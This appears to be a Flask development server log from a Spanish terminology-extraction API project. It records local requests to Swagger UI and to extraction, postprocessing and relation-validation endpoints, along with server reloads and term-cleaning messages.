+13:27:59, INFO 127.0.0.1 - - [03/Jul/2021 13:27:59] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+13:27:59, INFO 127.0.0.1 - - [03/Jul/2021 13:27:59] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+13:27:59, INFO 127.0.0.1 - - [03/Jul/2021 13:27:59] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+13:28:00, INFO 127.0.0.1 - - [03/Jul/2021 13:28:00] "GET /static/swagger.json HTTP/1.1" 200 -
+13:28:04, INFO 127.0.0.1 - - [03/Jul/2021 13:28:04] "POST /extract_terminology HTTP/1.1" 500 -
+13:29:32, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:29:32, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:29:37, INFO  * Restarting with fsevents reloader
+13:29:43, WARNING  * Debugger is active!
+13:29:44, INFO  * Debugger PIN: 273-160-618
+13:29:52, INFO 127.0.0.1 - - [03/Jul/2021 13:29:52] "GET /swagger/ HTTP/1.1" 200 -
+13:29:52, INFO 127.0.0.1 - - [03/Jul/2021 13:29:52] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+13:29:52, INFO 127.0.0.1 - - [03/Jul/2021 13:29:52] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+13:29:52, INFO 127.0.0.1 - - [03/Jul/2021 13:29:52] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+13:29:53, INFO 127.0.0.1 - - [03/Jul/2021 13:29:53] "GET /static/swagger.json HTTP/1.1" 200 -
+13:29:58, INFO 127.0.0.1 - - [03/Jul/2021 13:29:58] "POST /extract_terminology HTTP/1.1" 500 -
+13:33:44, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:33:44, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:33:46, INFO  * Restarting with fsevents reloader
+13:33:51, WARNING  * Debugger is active!
+13:33:51, INFO  * Debugger PIN: 273-160-618
+13:34:05, INFO 127.0.0.1 - - [03/Jul/2021 13:34:05] "GET /swagger/ HTTP/1.1" 200 -
+13:34:05, INFO 127.0.0.1 - - [03/Jul/2021 13:34:05] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+13:34:05, INFO 127.0.0.1 - - [03/Jul/2021 13:34:05] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+13:34:05, INFO 127.0.0.1 - - [03/Jul/2021 13:34:05] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+13:34:06, INFO 127.0.0.1 - - [03/Jul/2021 13:34:06] "GET /static/swagger.json HTTP/1.1" 200 -
+13:34:13, INFO 127.0.0.1 - - [03/Jul/2021 13:34:13] "POST /extract_terminology HTTP/1.1" 200 -
+13:35:39, INFO CLEAN_TERMS, DELETE (0) NEW LIST SIZE: (5) TIME: (0.010299205780029297)
+13:35:39, INFO TERMS REMOVED: 
+13:35:40, INFO 127.0.0.1 - - [03/Jul/2021 13:35:40] "POST /postprocess_terminology HTTP/1.1" 500 -
+13:36:17, INFO CLEAN_TERMS, DELETE (0) NEW LIST SIZE: (3) TIME: (0.0028519630432128906)
+13:36:17, INFO TERMS REMOVED: 
+13:36:18, INFO AÑOTADOR, DELETE (1) NEW LIST SIZE: (2) TIME: (1.0845391750335693)
+13:36:18, INFO TERMS REMOVED: <TIMEX3 tid="t1" type="DATE" value="2021-09-03">tres de septiembre</TIMEX3>
+13:36:18, INFO CLEAN_TERMS, DELETE (0) NEW LIST SIZE: (2) TIME: (0.0010008811950683594)
+13:36:18, INFO TERMS REMOVED: 
+13:36:18, INFO 127.0.0.1 - - [03/Jul/2021 13:36:18] "POST /postprocess_terminology HTTP/1.1" 200 -
+13:45:01, INFO 127.0.0.1 - - [03/Jul/2021 13:45:01] "POST /validate_relations HTTP/1.1" 200 -
